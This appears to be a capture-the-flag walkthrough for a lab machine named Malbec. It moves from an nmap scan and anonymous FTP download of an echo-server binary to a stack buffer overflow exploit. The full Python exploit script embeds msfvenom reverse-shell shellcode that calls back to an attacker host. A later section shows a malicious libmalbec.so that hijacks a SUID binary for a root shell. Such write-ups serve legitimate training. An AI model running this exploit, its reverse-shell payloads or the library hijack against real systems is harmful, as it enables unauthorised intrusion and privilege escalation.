# Malbec
### Enumeration
```
# Nmap 7.92 scan initiated Mon May  2 20:40:31 2022 as: nmap -sCV -v -p22,2121,7138 -oN nmap/tcp_all.out 192.168.220.129
Nmap scan report for ip-192-168-220-129.eu-west-1.compute.internal (192.168.220.129)
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
2121/tcp open  ftp     pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx   1 carlos   carlos     108304 Jan 25  2021 malbec.exe [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.220.129:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
7138/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7138-TCP:V=7.92%I=7%D=5/2%Time=627041CB%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,4,"\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  2 20:40:44 2022 -- 1 IP address (1 host up) scanned in 12.48 seconds
```

##### FTP
We can anonymously connect and find a single file, `malbec.exe`, which I downloaded.

```
file malbec.exe

malbec.exe: PE32 executable (console) Intel 80386, for MS Windows
```

If we connect to port 7138, we get an echo server. Perhaps the binary we downloaded is this server executable?

We can run it with `wine`. After doing so, it outputs `Waiting for incoming connections!`. If we try to `netcat` to localhost on the same port (`7138`), we connect to the server. So let's see if there's a buffer overflow. I'll just try to input a long character sequence and see if it crashes:

```
nc -nv 127.0.0.1 7138

(UNKNOWN) [127.0.0.1] 7138 (?) open
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

In the other window:

```
2-bit code (0x61616161).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:61616161 ESP:0041fc70 EBP:61616161 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:00000001 EBX:0000d916 ECX:0041fb18 EDX:00000000
 ESI:007b0e20 EDI:00000024
Stack dump:
0x0041fc70:  61616161 61616161 61616161 61616161
0x0041fc80:  61616161 61616161 61616161 61616161
0x0041fc90:  61616161 61616161 61616161 61616161
0x0041fca0:  61616161 61616161 61616161 61616161
0x0041fcb0:  61616161 61616161 61616161 61616161
0x0041fcc0:  61616161 61616161 61616161 61616161
Backtrace:
=>0 0x61616161 (0x61616161)
0x61616161: -- no code accessible --
...
```

The important part is we can see `EIP: 61616161`. So let's find the offset in the input at which the return address we want should go. Use a `-l` that's suitably large:

```
msf-pattern_create -l 1000

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

After sending this through the client, we see `EIP:6c41336c`. If we decode this, we get `lA3l`. We have to remember that this is little endian encoded, so the pattern is actually `l3Al`. We can use CyberChef to decode:

![[Pasted image 20220512071518.png]]

Alternatively, we can run the executable with `winedbg --gdb` and ensure `peda` is setup. Then, when the program crashes, `peda` will show us the decoded value of `EIP`:

```
EIP: 0x6c41336c ('l3Al')
```

Now we can put this into `msf-pattern_offset`:

```
msf-pattern_offset -q "l3Al"

[*] Exact match at offset 340
```

So our return address must go after 340 characters of junk. Now let's use `ROPgadget` to find a useful return address.

```
ROPgadget --binary malbec.exe | grep esp

...
0x41101503 : push esp ; ret
...
```

We can use the above sequence of two commands to move execution to the stack. If we set the first return address to be `0x41101503` and then immediately afterwards we have our code (we'll pad with some NOPs), then the code will return to this instruction, put `ESP` (which will be the start of our NOP sled) on the stack, then `ret`, which will set `EIP` to the address we just pushed.

The exploit is below.

```python
import sys
import socket
import struct

if len(sys.argv) != 3:
        print(f"usage: exploit <host> <port>")
        sys.exit(0)

HOST = sys.argv[1]
PORT = int(sys.argv[2])

push_esp_ret = struct.pack("<i", 0x41101503)

## Windows payload gives a command prompt shell.
## Linux payload gives a bash shell.

# Generated with msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.110 LPORT=2121  -f python -n 10 -b '\x00' --arch x86 --platform windows
buf =  b""
buf += b"\xfc\x43\x4b\x42\x37\xfd\x2f\xf8\xf8\x37\xbd\x7c\xe0"
buf += b"\xc9\x73\xdb\xc5\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x52"
buf += b"\x83\xc3\x04\x31\x6b\x0e\x03\x17\xee\x2b\x86\x1b\x06"
buf += b"\x29\x69\xe3\xd7\x4e\xe3\x06\xe6\x4e\x97\x43\x59\x7f"
buf += b"\xd3\x01\x56\xf4\xb1\xb1\xed\x78\x1e\xb6\x46\x36\x78"
buf += b"\xf9\x57\x6b\xb8\x98\xdb\x76\xed\x7a\xe5\xb8\xe0\x7b"
buf += b"\x22\xa4\x09\x29\xfb\xa2\xbc\xdd\x88\xff\x7c\x56\xc2"
buf += b"\xee\x04\x8b\x93\x11\x24\x1a\xaf\x4b\xe6\x9d\x7c\xe0"
buf += b"\xaf\x85\x61\xcd\x66\x3e\x51\xb9\x78\x96\xab\x42\xd6"
buf += b"\xd7\x03\xb1\x26\x10\xa3\x2a\x5d\x68\xd7\xd7\x66\xaf"
buf += b"\xa5\x03\xe2\x2b\x0d\xc7\x54\x97\xaf\x04\x02\x5c\xa3"
buf += b"\xe1\x40\x3a\xa0\xf4\x85\x31\xdc\x7d\x28\x95\x54\xc5"
buf += b"\x0f\x31\x3c\x9d\x2e\x60\x98\x70\x4e\x72\x43\x2c\xea"
buf += b"\xf9\x6e\x39\x87\xa0\xe6\x8e\xaa\x5a\xf7\x98\xbd\x29"
buf += b"\xc5\x07\x16\xa5\x65\xcf\xb0\x32\x89\xfa\x05\xac\x74"
buf += b"\x05\x76\xe5\xb2\x51\x26\x9d\x13\xda\xad\x5d\x9b\x0f"
buf += b"\x61\x0d\x33\xe0\xc2\xfd\xf3\x50\xab\x17\xfc\x8f\xcb"
buf += b"\x18\xd6\xa7\x66\xe3\xb1\x07\xde\xda\x30\xe0\x1d\x1c"
buf += b"\xbb\xb9\xa8\xfa\xd1\x29\xfd\x55\x4e\xd3\xa4\x2d\xef"
buf += b"\x1c\x73\x48\x2f\x96\x70\xad\xfe\x5f\xfc\xbd\x97\xaf"
buf += b"\x4b\x9f\x3e\xaf\x61\xb7\xdd\x22\xee\x47\xab\x5e\xb9"
buf += b"\x10\xfc\x91\xb0\xf4\x10\x8b\x6a\xea\xe8\x4d\x54\xae"
buf += b"\x36\xae\x5b\x2f\xba\x8a\x7f\x3f\x02\x12\xc4\x6b\xda"
buf += b"\x45\x92\xc5\x9c\x3f\x54\xbf\x76\x93\x3e\x57\x0e\xdf"
buf += b"\x80\x21\x0f\x0a\x77\xcd\xbe\xe3\xce\xf2\x0f\x64\xc7"
buf += b"\x8b\x6d\x14\x28\x46\x36\x24\x63\xca\x1f\xad\x2a\x9f"
buf += b"\x1d\xb0\xcc\x4a\x61\xcd\x4e\x7e\x1a\x2a\x4e\x0b\x1f"
buf += b"\x76\xc8\xe0\x6d\xe7\xbd\x06\xc1\x08\x94"

# Generated with msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.113 LPORT=2121  -f python -n 10 -b '\x00'
buf =  b""
buf += b"\x93\x49\x9f\x91\x48\x9f\xf9\x98\x40\x92\xdb\xd0\xb8"
buf += b"\x84\xa0\xbb\xde\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12"
buf += b"\x83\xeb\xfc\x31\x43\x13\x03\xc7\xb3\x59\x2b\xf6\x68"
buf += b"\x6a\x37\xab\xcd\xc6\xd2\x49\x5b\x09\x92\x2b\x96\x4a"
buf += b"\x40\xea\x98\x74\xaa\x8c\x90\xf3\xcd\xe4\xe2\xac\x1f"
buf += b"\x85\x8a\xae\x5f\x6d\x02\x26\xbe\xdd\xf2\x68\x10\x4e"
buf += b"\x48\x8b\x1b\x91\x63\x0c\x49\x39\x12\x22\x1d\xd1\x82"
buf += b"\x13\xce\x43\x3a\xe5\xf3\xd1\xef\x7c\x12\x65\x04\xb2"
buf += b"\x55"

payload = b"A" * 340 + push_esp_ret + buf

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(payload)
        s.recv(1024)
```

To run the exploit, we pass the IP of the target machine and the port in this case is `7138`. We need a `nc` listener in another window listening on port `2121` (or whatever port you used when creating the MSF payload), and I preceeded that with `rlwrap` to be able to use the arrow keys in the shell. Initially I tried `x64`, then remembered that `file` had earlier shown `malbec.exe: PE32 executable (console) Intel 80386, for MS Windows`, so tried `x86` and got a reverse shell!

We can immediately get the user flag.

_UPDATE:_ Doing the above with a Windows payload gives a windows shell. If we use the linux payload, we get a bash shell.

Once we get a bash shell, we upgrade to fully interactive. Checking for SUID binaries, we see the following that stands out:

```
find / -user root -perm -4000 -print 2>/dev/null

<snip>
/usr/bin/messenger
<snip>
```

If we try to run it, we get:

```
messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
```

We can further check using `ldd`:

```
ldd /usr/bin/messenger

linux-vdso.so.1 (0x00007ffd2c9d6000)
libmalbec.so => not found
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3c3c087000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3c3c25d000)
```

If we look in `/etc/ld.so.conf`, we see:

```
include /etc/ld.so.conf.d/*.conf
```

In `/etc/ld.so.conf.d`, we see a file `malbec.conf`, which has the contents:

```
/home/carlos
```

So if we put a file called `libmalbec.so` in `/home/carlos`, we can hijack the `messenger` program. We need to find what function from this library is used by `messenger`.

Using `nm -D /usr/bin/messenger`, we see a function `malbec`. Analyzing with Ghidra, we confirm that `malbec` is a function and Ghidra cannot find a definition (because it's supposed to be coming from `libmalbec.so`). We can create a malicious library. First, we create a file `libmalbec.c`:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void malbec() {
        setuid(0);
        setgid(0);
        printf("I'm the bad library\n");
        system("/bin/sh",NULL,NULL);
}
```

Now we compile this to `libmalbec.so`:

```
gcc -shared -o libmalbec.so -fPIC libmalbec.c
```

Now we transfer this library to the target machine (I used `wget` on the target and the python HTTP server locally). Now we can check this is being loaded by `messenger`:

```
ldd $(which messenger)

linux-vdso.so.1 (0x00007ffe35ffd000)
libmalbec.so => /home/carlos/libmalbec.so (0x00007f5dde46d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5dde2ac000)
/lib64/ld-linux-x86-64.so.2 (0x00007f5dde487000)
```

Perfect. Now, when we execute `messenger`, we get a root shell!